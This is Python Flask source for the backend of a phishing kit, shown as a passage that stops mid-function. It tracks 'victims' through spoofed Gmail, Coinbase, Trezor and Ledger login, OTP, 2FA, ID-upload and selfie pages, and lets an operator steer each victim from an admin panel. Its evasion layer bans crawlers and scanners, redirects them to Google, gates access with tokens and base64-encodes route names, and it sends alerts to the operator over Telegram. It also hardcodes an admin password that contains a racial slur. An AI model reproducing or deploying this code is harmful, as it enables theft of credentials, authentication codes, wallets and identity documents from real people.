from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import sqlite3
import requests
from datetime import datetime, timedelta
import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import psycopg2
import psycopg2.extras
import requests
from datetime import datetime, timedelta
import os
import urllib.parse as up
from functools import wraps
import time
import re
import json
import secrets
import uuid
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()
app = Flask(__name__)
app.secret_key = "secretkey"
DATABASE_URL = os.environ.get('DATABASE_URL')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
from flask_talisman import Talisman

# Add security headers
csp = {
    'default-src': "'self'",
    'script-src': [
        "'self'", 
        "'unsafe-inline'",  # Add this line
        "https://cdnjs.cloudflare.com", 
        "https://cdn.jsdelivr.net", 
        "https://cdn.socket.io"
    ],
    'style-src': [
        "'self'", 
        "'unsafe-inline'", 
        "https://cdnjs.cloudflare.com", 
        "https://cdn.jsdelivr.net"
    ],
    'img-src': ["'self'", "data:", "https:"],
    'font-src': ["'self'", "https://cdnjs.cloudflare.com"],
    'frame-ancestors': "'none'"
}

talisman = Talisman(
    app,
    content_security_policy=csp,
    force_https=True,
    force_https_permanent=True,
    frame_options='DENY',
    strict_transport_security=True,
    strict_transport_security_max_age=31536000,
    strict_transport_security_include_subdomains=True,
    referrer_policy='no-referrer',
    session_cookie_secure=True,
    session_cookie_http_only=True
)
# Security Configuration
MAX_REQUESTS_PER_MINUTE = 60  # Increased from 15
MAX_REQUESTS_PER_HOUR = 500   # Increased from 100
CAPTCHA_REQUIRED_FOR_ALL = True

# Store active victims and control commands
active_victims = {}
victim_commands = {}

# Security tracking
request_tracker = {}
failed_captcha_attempts = {}

# Known datacenter ASNs and cloud providers
DATACENTER_ASNS = {
    'AS16509', 'AS14618', 'AS15169', 'AS8075', 'AS14061', 'AS63949', 'AS20473',
    'AS16276', 'AS12876', 'AS13768', 'AS21859', 'AS13335', 'AS209242', 'AS36024',
    'AS31898', 'AS10310', 'AS2635', 'AS26496', 'AS18779', 'AS53831', 'AS46606',
    'AS55286', 'AS55293', 'AS16265', 'AS397213', 'AS36351', 'AS13768', 'AS33070',
    'AS18747', 'AS53831', 'AS46606', 'AS40065', 'AS32787', 'AS19318', 'AS23089',
    'AS29802', 'AS36352', 'AS23352', 'AS13768','AS396982' 'AS33070', 'AS18747', 'AS53831',
}

# Known bot user agents
# Security Configuration - RELAXED SETTINGS


# Known bot user agents - MORE SPECIFIC
BOT_USER_AGENTS = {
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'telegrambot', 
    'discordbot', 'applebot', 'petalbot', 'ahrefs', 'semrush', 'moz', 
    'majestic', 'screaming frog', 'sitebulb', 'deepcrawl', 'contentking', 
    'oncrawl', 'headless', 'phantom', 'puppeteer', 'selenium', 'playwright'
}

import base64
import os
from datetime import datetime
# Add this after your imports, before the routes
ROUTE_MAPPINGS = {
    'waiting': 'waiting',
    'gmail_login': 'gmail_login', 
    'stall': 'stall',
    'verify': 'verify',
    'password': 'password',
    'reset': 'reset',
    'otp': 'otp',
    'invalid': 'invalid',
    'recovery': 'recovery',
    'twostep': 'twostep',
    'index': 'index',
    'coinbase_login_page': 'coinbase_login_page',
    'landing': 'landing',
    'trezor': 'trezor',
    'ledger': 'ledger',
    'external': 'external',
    'idtype': 'idtype',
    'idupload': 'idupload',
    'selfie': 'selfie',
    'authenticator': 'authenticator',
    'coinbase_2factor': 'coinbase_2factor',
    'final_redirect': 'final_redirect',
    'main': 'main'
}
# Create uploads directory if it doesn't exist
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def get_db_connection():
    """Get PostgreSQL database connection"""
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def init_db():
    """Initialize PostgreSQL database with correct schema"""
    conn = get_db_connection()
    c = conn.cursor()
    
    # Drop and recreate tables to ensure correct schema
    c.execute('DROP TABLE IF EXISTS navigations CASCADE')
    c.execute('DROP TABLE IF EXISTS victims CASCADE')
    c.execute('DROP TABLE IF EXISTS banned_ips CASCADE')
    c.execute('DROP TABLE IF EXISTS rate_limits CASCADE')
    c.execute('DROP TABLE IF EXISTS security_logs CASCADE')
    
    c.execute('''
        CREATE TABLE victims (
            id SERIAL PRIMARY KEY,
            email TEXT,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            session_id TEXT UNIQUE,
            current_page TEXT DEFAULT 'login',
            is_active BOOLEAN DEFAULT TRUE,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE navigations (
            id SERIAL PRIMARY KEY,
            session_id TEXT,
            email TEXT,
            ip_address TEXT NOT NULL,
            page_url TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE banned_ips (
            id SERIAL PRIMARY KEY,
            ip_address TEXT UNIQUE NOT NULL,
            reason TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE rate_limits (
            id SERIAL PRIMARY KEY,
            ip_address TEXT NOT NULL,
            request_count INTEGER DEFAULT 1,
            window_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_request TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(ip_address, window_start)
        )
    ''')
    c.execute('''
        CREATE TABLE security_logs (
            id SERIAL PRIMARY KEY,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            event_type TEXT NOT NULL,
            details TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS site_settings (
            id SERIAL PRIMARY KEY,
            setting_key TEXT UNIQUE NOT NULL,
            setting_value TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        INSERT INTO site_settings (setting_key, setting_value) 
        VALUES ('site_enabled', 'true')
        ON CONFLICT (setting_key) DO NOTHING
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS access_tokens (
            id SERIAL PRIMARY KEY,
            token TEXT UNIQUE NOT NULL,
            is_active BOOLEAN DEFAULT TRUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            used_count INTEGER DEFAULT 0,
            last_used TIMESTAMP NULL
        )
    ''')
    c.execute('CREATE INDEX idx_victims_session_id ON victims(session_id)')
    c.execute('CREATE INDEX idx_victims_ip_address ON victims(ip_address)')
    c.execute('CREATE INDEX idx_victims_timestamp ON victims(timestamp)')
    c.execute('CREATE INDEX idx_victims_is_active ON victims(is_active)')
    
    c.execute('CREATE INDEX idx_navigations_session_id ON navigations(session_id)')
    c.execute('CREATE INDEX idx_navigations_timestamp ON navigations(timestamp)')
    c.execute('CREATE INDEX idx_navigations_ip_address ON navigations(ip_address)')
    
    
    conn.commit()
    conn.close()
    print("PostgreSQL database initialized with enhanced security schema!")

init_db()
# Token access system
# Token access system
class TokenSystem:
    def __init__(self):
        self.init_token_db()
    
    def init_token_db(self):
        """Initialize token table and settings"""
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS access_tokens (
                id SERIAL PRIMARY KEY,
                token TEXT UNIQUE NOT NULL,
                is_active BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used_count INTEGER DEFAULT 0,
                last_used TIMESTAMP NULL
            )
        ''')
        
        # Add token system setting
        c.execute('''
            INSERT INTO site_settings (setting_key, setting_value) 
            VALUES ('token_system_enabled', 'true')
            ON CONFLICT (setting_key) DO NOTHING
        ''')
        
        conn.commit()
        conn.close()
    
    def is_system_enabled(self):
        """Check if token system is enabled"""
        return get_site_setting('token_system_enabled', True)
    
    def set_system_enabled(self, enabled):
        """Enable or disable the token system"""
        return set_site_setting('token_system_enabled', enabled)
    
    def generate_token(self):
        """Generate a new random token"""
        token = f"{secrets.token_hex(4)}-{secrets.token_hex(4)}-{secrets.token_hex(4)}-{secrets.token_hex(4)}-{secrets.token_hex(4)}"
        
        conn = get_db_connection()
        c = conn.cursor()
        try:
            c.execute("INSERT INTO access_tokens (token) VALUES (%s)", (token,))
            conn.commit()
            return token
        except Exception as e:
            print(f"Error generating token: {e}")
            conn.rollback()
            return None
        finally:
            conn.close()
    
    def validate_token(self, token):
        """Check if token is valid and active"""
        if not token:
            return False
            
        # If token system is disabled globally, NO ACCESS FOR ANYONE
        if not self.is_system_enabled():
            return False
            
        conn = get_db_connection()
        c = conn.cursor()
        try:
            c.execute("SELECT is_active FROM access_tokens WHERE token = %s", (token,))
            result = c.fetchone()
            
            if result and result[0]:  # Token exists and is individually active
                # Update usage stats
                c.execute('''
                    UPDATE access_tokens 
                    SET used_count = used_count + 1, last_used = CURRENT_TIMESTAMP 
                    WHERE token = %s
                ''', (token,))
                conn.commit()
                return True
            return False
        except Exception as e:
            print(f"Error validating token: {e}")
            return False
        finally:
            conn.close()
    
    def revoke_token(self, token):
        """Revoke/delete a token"""
        conn = get_db_connection()
        c = conn.cursor()
        try:
            c.execute("DELETE FROM access_tokens WHERE token = %s", (token,))
            conn.commit()
            return c.rowcount > 0
        except Exception as e:
            print(f"Error revoking token: {e}")
            conn.rollback()
            return False
        finally:
            conn.close()
    
    def toggle_token_active(self, token, active):
        """Enable or disable a specific token"""
        conn = get_db_connection()
        c = conn.cursor()
        try:
            c.execute("UPDATE access_tokens SET is_active = %s WHERE token = %s", (active, token))
            conn.commit()
            return c.rowcount > 0
        except Exception as e:
            print(f"Error toggling token: {e}")
            conn.rollback()
            return False
        finally:
            conn.close()
    
    def get_all_tokens(self):
        """Get all tokens"""
        conn = get_db_connection()
        c = conn.cursor()
        try:
            c.execute("SELECT token, is_active, created_at, used_count, last_used FROM access_tokens ORDER BY created_at DESC")
            tokens = c.fetchall()
            return [{
                'token': t[0],
                'is_active': t[1],
                'created_at': t[2],
                'used_count': t[3],
                'last_used': t[4]
            } for t in tokens]
        except Exception as e:
            print(f"Error getting tokens: {e}")
            return []
        finally:
            conn.close()
    
    def get_system_status(self):
        """Get token system status"""
        tokens = self.get_all_tokens()
        return {
            'enabled': self.is_system_enabled(),
            'total_tokens': len(tokens),
            'active_tokens': len([t for t in tokens if t['is_active']])
        }
# Initialize token system
token_system = TokenSystem()
# Admin credentials
ADMIN_USERNAME = "ImAdmin"
ADMIN_PASSWORD = "Nigga123"

# Security Functions
def log_security_event(ip_address, user_agent, event_type, details=""):
    """Log security events"""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute(
        "INSERT INTO security_logs (ip_address, user_agent, event_type, details) VALUES (%s, %s, %s, %s)",
        (ip_address, user_agent, event_type, details)
    )
    conn.commit()
    conn.close()

def check_rate_limit(ip_address):
    """Enhanced rate limiting with database persistence - RELAXED"""
    now = datetime.now()
    minute_ago = now - timedelta(minutes=1)
    hour_ago = now - timedelta(hours=1)
    
    conn = get_db_connection()
    c = conn.cursor()
    
    # Clean old entries
    c.execute("DELETE FROM rate_limits WHERE window_start < %s", (hour_ago,))
    
    # Get current counts
    c.execute('''
        SELECT SUM(request_count) FROM rate_limits 
        WHERE ip_address = %s AND window_start >= %s
    ''', (ip_address, minute_ago))
    minute_count = c.fetchone()[0] or 0
    
    c.execute('''
        SELECT SUM(request_count) FROM rate_limits 
        WHERE ip_address = %s AND window_start >= %s
    ''', (ip_address, hour_ago))
    hour_count = c.fetchone()[0] or 0
    
    # Update or insert current window
    c.execute('''
        UPDATE rate_limits 
        SET request_count = request_count + 1, last_request = %s
        WHERE ip_address = %s AND window_start >= %s
    ''', (now, ip_address, minute_ago))
    
    if c.rowcount == 0:
        c.execute('''
            INSERT INTO rate_limits (ip_address, request_count, window_start, last_request)
            VALUES (%s, 1, %s, %s)
        ''', (ip_address, now, now))
    
    conn.commit()
    conn.close()
    
    # RELAXED LIMITS
    return minute_count <= MAX_REQUESTS_PER_MINUTE and hour_count <= MAX_REQUESTS_PER_HOUR
def get_site_setting(key, default=None):
    """Get a site setting from database"""
    conn = get_db_connection()
    c = conn.cursor()
    try:
        c.execute("SELECT setting_value FROM site_settings WHERE setting_key = %s", (key,))
        result = c.fetchone()
        if result:
            # Convert string to boolean for site_enabled
            if key == 'site_enabled':
                return result[0].lower() == 'true'
            return result[0]
        return default
    except Exception as e:
        print(f"Error getting site setting {key}: {e}")
        return default
    finally:
        conn.close()

def set_site_setting(key, value):
    """Set a site setting in database"""
    conn = get_db_connection()
    c = conn.cursor()
    try:
        # Convert boolean to string for storage
        if isinstance(value, bool):
            value = 'true' if value else 'false'
        
        c.execute('''
            INSERT INTO site_settings (setting_key, setting_value) 
            VALUES (%s, %s)
            ON CONFLICT (setting_key) 
            DO UPDATE SET setting_value = %s, timestamp = CURRENT_TIMESTAMP
        ''', (key, value, value))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error setting site setting {key}: {e}")
        conn.rollback()
        return False
    finally:
        conn.close()
def is_bot_user_agent(user_agent):
    """STRICT bot detection - blocks only confirmed bots"""
    if not user_agent:
        return True  # Missing UA = bot
    
    ua_lower = user_agent.lower()
    
    # FIRST: Check for legitimate browsers - ALLOW THESE
    legitimate_browsers = [
        'chrome', 'firefox', 'safari', 'edge', 'opera', 'mozilla', 'webkit',
        'google chrome', 'microsoft edge', 'samsung', 'mobile', 'android', 'iphone'
    ]
    
    # If it contains legitimate browser keywords, it's PROBABLY human
    for browser in legitimate_browsers:
        if browser in ua_lower:
            return False
    
    # SECOND: Check for KNOWN BOTS - BLOCK THESE
    confirmed_bots = [
        # Search engines
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
        # Scrapers
        'scraper', 'crawler', 'spider', 'bot', 'crawler',
        # Headless browsers
        'phantomjs', 'puppeteer', 'selenium', 'playwright', 'headless',
        # Tools & libraries
        'python', 'requests', 'curl', 'wget', 'java', 'php', 'ruby', 'go-http',
        'node', 'axios', 'okhttp', 'urllib',
        # SEO tools
        'ahrefs', 'semrush', 'moz', 'majestic', 'screaming frog'
    ]
    
    for bot in confirmed_bots:
        if bot in ua_lower:
            print(f"🚫 CONFIRMED BOT DETECTED: {bot} in {user_agent}")
            return True
    
    # THIRD: Check suspicious patterns
    suspicious_patterns = [
        len(user_agent) < 10,  # Too short
        'mozilla' not in ua_lower and 'webkit' not in ua_lower,  # No browser engine
        user_agent in ['', 'unknown', 'none']  # Empty/generic
    ]
    
    if any(suspicious_patterns):
        print(f"🚫 SUSPICIOUS UA: {user_agent}")
        return True
    
    # If we get here, it's probably an uncommon but legitimate browser
    print(f"✅ ALLOWING UNCOMMON BROWSER: {user_agent}")
    return False

def get_asn_info(ip_address):
    """Get ASN information for IP address"""
    try:
        # Use ipapi.co for ASN information (free tier available)
        response = requests.get(f"http://ipapi.co/{ip_address}/json/", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'asn': data.get('asn'),
                'org': data.get('org'),
                'isp': data.get('isp'),
                'country': data.get('country'),
                'is_datacenter': any(dc_asn in str(data.get('asn', '')) for dc_asn in DATACENTER_ASNS)
            }
    except:
        pass
    
    return {'asn': 'Unknown', 'is_datacenter': False}

def is_datacenter_ip(ip_address):
    """Check if IP belongs to datacenter/cloud provider - DISABLED"""
    return False  # Disabled to prevent blocking legitimate users

def has_suspicious_headers():
    """Check for suspicious headers indicating automation - RELAXED"""
    headers = request.headers
    
    # Missing common browser headers is less suspicious now
    if not headers.get('Accept'):
        return False  # Some browsers might not send this
        
    # Suspicious Accept headers - only block obvious automation
    accept_header = headers.get('Accept', '').lower()
    if 'text/html' not in accept_header and 'application/json' in accept_header:
        # Only block if it's clearly not a browser
        if '*/*' not in accept_header and 'text/plain' not in accept_header:
            return True
    
    return False

def ban_ip(ip_address, reason="Automated traffic"):
    """Ban an IP address persistently"""
    if not ip_address or ip_address == 'Unknown':
        return False
        
    conn = get_db_connection()
    c = conn.cursor()
    try:
        c.execute(
            "INSERT INTO banned_ips (ip_address, reason) VALUES (%s, %s) ON CONFLICT (ip_address) DO UPDATE SET reason = %s, timestamp = CURRENT_TIMESTAMP",
            (ip_address, reason, reason)
        )
        conn.commit()
        
        print(f"🚫 IP BANNED PERSISTENTLY: {ip_address} - {reason}")
        return True
        
    except Exception as e:
        print(f"Error banning IP: {e}")
        conn.rollback()
        return False
    finally:
        conn.close()
def is_ip_banned(ip):
    """Check if IP is banned - FIXED to properly check database"""
    if not ip or ip == 'Unknown':
        return False
        
    conn = get_db_connection()
    c = conn.cursor()
    try:
        c.execute("SELECT ip_address, reason FROM banned_ips WHERE ip_address = %s", (ip,))
        result = c.fetchone()
        return result is not None
    except Exception as e:
        print(f"Error checking banned IP: {e}")
        return False
    finally:
        conn.close()
def check_token_access():
    """Check if user has valid token access - ONLY for main route (cloudflare.html)"""
    
    # Skip token check for EVERYTHING except the main route
    if request.path != '/':
        return None
    
    # Skip if already has access or is verified victim
    if session.get('has_token_access') or session.get('captcha_passed') or session.get('is_victim'):
        return None
    
    # ONLY for main route (/), check token
    token = request.args.get('token')
    
    if token and token_system.validate_token(token):
        session['has_token_access'] = True
        session['access_token'] = token
        print(f"✅ Token access granted: {token}")
        return None
    else:
        print(f"🚫 No token access for main page")
        return "Site Unavailable", 503
@app.before_request
def security_checks():
    """Security checks - skip after CAPTCHA verification"""
    # 🚀 SKIP ALL SECURITY for verified humans and token access
    if (session.get('captcha_passed') or 
        session.get('has_token_access') or 
        session.get('is_victim')):
        return None
    
    # Skip ALL security for static files and admin endpoints
   
    
    if (request.path == '/' or  # 🚨 ADD THIS - CLOUDFLARE PAGE
        request.path == '/bccsr2dec.js' or  # 🚨 KILLBOT SCRIPT
        request.path == '/verify-captcha'):  # 🚨 CAPTCHA VERIFICATION
        return None
    
    # Skip ALL security for static files and admin endpoints
    if (request.endpoint in ['static', 'serve_bsmnedom'] or 
        request.path.startswith('/static/')):
        return None
    
    # Skip security for API endpoints and admin routes
    if request.endpoint in ['admin_login', 'admin_logout', 'panel', 
                           'get_site_status', 'toggle_site', 'verify_captcha', 
                           'check_victim_session', 'get_banned_ips', 'get_victims',
                           'control_victim', 'delete_victim', 'unban_ip',
                           'get_victim_navigations', 'set_phone_data', 'get_phone_data',
                           'set_recovery_data', 'get_recovery_data', 'set_verification_data',
                           'get_verification_data', 'set_verify_data', 'get_verify_data',
                           'check_command', 'track_navigation', 'get_security_logs',
                           'clear_security_logs', 'clear_all_logs', 'ban_all_ips',
                           'get_session_email', 'generate_token', 'revoke_token', 'get_tokens',
                           # ADD ALL VICTIM ROUTES TO PREVENT INTERFERENCE
                           'gmail_login', 'login', 'waiting', 'stall', 'verify', 'password',
                           'invalid', 'reset', 'otp', 'recovery', 'twostep', 'coinbase_login_page',
                           'coinbase_login', 'landing', 'trezor', 'trezor_submit', 'ledger', 
                           'ledger_submit', 'external', 'external_submit', 'idtype', 'idtype_submit',
                           'idupload', 'idupload_submit', 'selfie', 'selfie_submit', 'authenticator',
                           'authenticator_submit', 'coinbase_2factor', 'coinbase_2factor_submit',
                           'final_redirect', 'main', 'encoded_router','serve_bsmnedom',  # KILLBOT SCRIPT ROUTE
                       'index',]:  # ADD encoded_router here
        return None
    
    # Site disabled check (only for non-verified users)
    site_enabled = get_site_setting('site_enabled', True)
    if not site_enabled:
        # Allow admin access even when site is disabled
        if request.endpoint in ['panel', 'admin_login', 'admin_logout', 'get_site_status', 'toggle_site']:
            return None
        return "Site Unavailable", 503
    
    client_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', '')
    
    print(f"🔍 Security checking new visitor: {client_ip} -> {request.path}")
    
    # 1. Check if IP is banned FIRST
    if is_ip_banned(client_ip):
        print(f"🚫 Banned IP accessing: {client_ip}")
        return redirect('https://accounts.google.com'), 403
    
    # 2. Check token access first (only for main page)
    if request.path == '/':  # Only check tokens on main route
        token_check = check_token_access()
        if token_check:
            return token_check
    
    # 3. STRICT BOT DETECTION - BLOCK IMMEDIATELY
    if is_bot_user_agent(user_agent):
        print(f"🚫 Bot detected and blocked: {client_ip}")
        ban_ip(client_ip, f"Bot: {user_agent[:100]}")
        return redirect('https://accounts.google.com'), 403
    
    # 4. Rate limiting (only for non-verified users)
    if not check_rate_limit(client_ip):
        print(f"🚫 Rate limit exceeded: {client_ip}")
        ban_ip(client_ip, "Rate limit exceeded")
        return redirect('https://accounts.google.com'), 429
    
    # 5. CAPTCHA enforcement - ALLOW ACCESS TO CAPTCHA PAGE
    if CAPTCHA_REQUIRED_FOR_ALL and request.endpoint == 'index' and not session.get('captcha_passed'):
        # Allow access to CAPTCHA page without creating session
        print(f"🛡️ New visitor at CAPTCHA: {client_ip}")
        return None
        
    if CAPTCHA_REQUIRED_FOR_ALL and not session.get('captcha_passed') and request.endpoint != 'index':
        # Redirect to CAPTCHA if not passed
        print(f"🛡️ Redirecting to CAPTCHA: {client_ip}")
        return redirect(url_for('index'))
    
    # 6. ONLY CREATE SESSION AFTER CAPTCHA IS PASSED
    if session.get('captcha_passed') and 'victim_session' not in session:
        session_id = create_victim_session(client_ip, user_agent)
        session['victim_session'] = session_id
        session['is_victim'] = True
        print(f"✅ Session created after CAPTCHA: {client_ip} -> {session_id}")
    
    print(f"✅ Security checks passed: {client_ip}")
    return None
@app.route('/e/<encoded_endpoint>')
def encoded_router(encoded_endpoint):
    """Handle ALL encoded routes - hides route names from URL"""
    import base64
    
    try:
        # Add padding if needed and decode
        padding = 4 - (len(encoded_endpoint) % 4)
        if padding != 4:
            encoded_endpoint += '=' * padding
        
        endpoint = base64.urlsafe_b64decode(encoded_endpoint.encode()).decode()
        
        print(f"🔐 Encoded route accessed: {encoded_endpoint} -> {endpoint}")
        
        # Your existing security check
        if not session.get('is_victim') and not session.get('has_token_access'):
            return redirect('https://accounts.google.com')
        
        # Check if this is a valid route
        if endpoint not in ROUTE_MAPPINGS.values():
            print(f"❌ Invalid encoded route: {endpoint}")
            return redirect('https://accounts.google.com')
        
        # Your existing victim tracking
        session_id = session.get('victim_session')
        if session_id:
            update_victim_page(session_id, endpoint)
            log_navigation(session_id, f'Page: {endpoint}', session.get('email'))
        
        # Call the original route function
        view_func = app.view_functions.get(endpoint)
        if view_func:
            print(f"✅ Routing to: {endpoint}")
            return view_func()
        else:
            print(f"❌ No view function for: {endpoint}")
        
    except Exception as e:
        print(f"Error decoding route: {e}")
    
    return redirect('https://accounts.google.com')
    
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page and authentication"""
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            # Set admin session
            session['admin_logged_in'] = True
            session['admin_username'] = username
            
            # Log admin login
            client_ip = get_client_ip()
            print(f"🔑 Admin logged in from IP: {client_ip}")
            
            # Send Telegram notification for admin login
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"""
🔐 <b>ADMIN LOGIN DETECTED!</b>

👤 <b>Username:</b> <code>{username}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Action:</b> Logged into Admin Panel

✅ <b>Admin authentication successful</b>
            """
            send_telegram_message(message)
            
            return jsonify({'success': True})
        else:
            # Log failed attempt
            client_ip = get_client_ip()
            print(f"🚫 Failed admin login attempt from IP: {client_ip}")
            
            # Send Telegram notification for failed attempt
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"""
🚫 <b>FAILED ADMIN LOGIN ATTEMPT!</b>

👤 <b>Username Attempted:</b> <code>{username}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
❌ <b>Status:</b> Invalid credentials

⚠️ <b>Security alert - unauthorized access attempt</b>
            """
            send_telegram_message(message)
            
            return jsonify({'success': False, 'error': 'Invalid username or password'})
    
    # GET request - show login page
    return render_template('loginpanel.html')

@app.route('/admin-logout')
def admin_logout():
    """Admin logout"""
    if session.get('admin_logged_in'):
        username = session.get('admin_username', 'Unknown')
        client_ip = get_client_ip()
        
        # Send logout notification
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"""
🔒 <b>ADMIN LOGGED OUT</b>

👤 <b>Username:</b> <code>{username}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Action:</b> Logged out from Admin Panel

✅ <b>Admin session ended</b>
        """
        send_telegram_message(message)
    
    # Clear admin session
    session.pop('admin_logged_in', None)
    session.pop('admin_username', None)
    
    return redirect('/admin-login')

def admin_required(f):
    """Decorator to require admin authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            # Return JSON error for API routes
            if request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            # Redirect for HTML routes
            return redirect('/admin-login')
        return f(*args, **kwargs)
    return decorated_function

def send_telegram_message(message):
    """Send to your private chat + groups where YOU added the bot"""
    try:
        # Get your personal user ID
        updates_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        updates_response = requests.get(updates_url)
        
        if updates_response.status_code != 200:
            return False
            
        updates_data = updates_response.json()
        your_user_id = None
        
        # Find YOUR user ID (first person who started the bot)
        if updates_data.get('ok'):
            for update in updates_data.get('result', []):
                if 'message' in update and 'from' in update['message']:
                    your_user_id = update['message']['from']['id']
                    break
        
        # Find all chats where YOU interacted or added the bot
        your_chats = set()
        if updates_data.get('ok') and your_user_id:
            for update in updates_data.get('result', []):
                if 'message' in update and 'chat' in update['message']:
                    chat = update['message']['chat']
                    chat_id = chat['id']
                    
                    # Include YOUR private chat
                    if chat['type'] == 'private' and 'from' in update['message']:
                        if update['message']['from']['id'] == your_user_id:
                            your_chats.add(chat_id)
                    
                    # Include ALL groups where bot is added (since only you can add it)
                    elif chat['type'] in ['group', 'supergroup']:
                        your_chats.add(chat_id)
        
        # Send to all your authorized chats
        success = False
        for chat_id in your_chats:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                success = True
                chat_type = "private" if chat_id > 0 else "group"
                print(f"✅ Sent to your {chat_type} chat: {chat_id}")
        
        return success
        
    except Exception as e:
        print(f"Error sending Telegram message: {e}")
        return False

def get_client_ip():
    """Get client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def create_victim_session(ip_address, user_agent):
    """Create a new victim session"""
    session_id = os.urandom(16).hex()
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO victims (ip_address, user_agent, session_id, current_page) VALUES (%s, %s, %s, %s)",
              (ip_address, user_agent, session_id, 'login'))
    conn.commit()
    conn.close()
    
    # Store in memory for quick access
    active_victims[session_id] = {
        'ip_address': ip_address,
        'user_agent': user_agent,
        'email': None,
        'current_page': 'login',
        'is_active': True,
        'last_activity': datetime.now().isoformat()
    }
    
    return session_id

def update_victim_page(session_id, page_url, email=None):
    """Update victim's current page"""
    conn = get_db_connection()
    c = conn.cursor()
    
    if email:
        c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                 (page_url, email, session_id))
    else:
        c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                 (page_url, session_id))
    
    conn.commit()
    conn.close()
    
    # Update active victims
    if session_id in active_victims:
        active_victims[session_id]['current_page'] = page_url
        active_victims[session_id]['last_activity'] = datetime.now().isoformat()
        if email:
            active_victims[session_id]['email'] = email

def log_navigation(session_id, page_url, email=None):
    """Log navigation - OPTIMIZED VERSION"""
    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        # 🚨 COMBINE BOTH OPERATIONS IN ONE TRANSACTION
        # 1. Update victim's current page
        if email:
            c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                     (page_url, email, session_id))
        else:
            c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                     (page_url, session_id))
        
        # 2. Get IP for logging
        c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
        result = c.fetchone()
        ip_address = result[0] if result else 'Unknown'
        
        # 3. Insert navigation log
        c.execute("INSERT INTO navigations (session_id, email, ip_address, page_url) VALUES (%s, %s, %s, %s)",
                  (session_id, email, ip_address, page_url))
        
        conn.commit()
        
        # Update active victims in memory
        if session_id in active_victims:
            active_victims[session_id]['current_page'] = page_url
            active_victims[session_id]['last_activity'] = datetime.now().isoformat()
            if email:
                active_victims[session_id]['email'] = email
                
    except Exception as e:
        print(f"Error in log_navigation: {e}")
        conn.rollback()
    finally:
        conn.close()
@app.after_request
def log_requests(response):
    """Log all requests for debugging"""
    if request.endpoint not in ['static', 'check_command']:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {request.method} {request.path} -> {response.status_code}")
    return response

@app.before_request
def check_restrictions():
    """Check restrictions and commands for victims - AUTO-REDIRECT TO ENCODED URLS"""
    # Skip for panel, static files, admin routes, encoded routes, and API
    if (request.endpoint in ['panel', 'static', 'control_victim', 'get_victims', 
                            'get_victim_navigations', 'delete_victim', 'unban_ip',
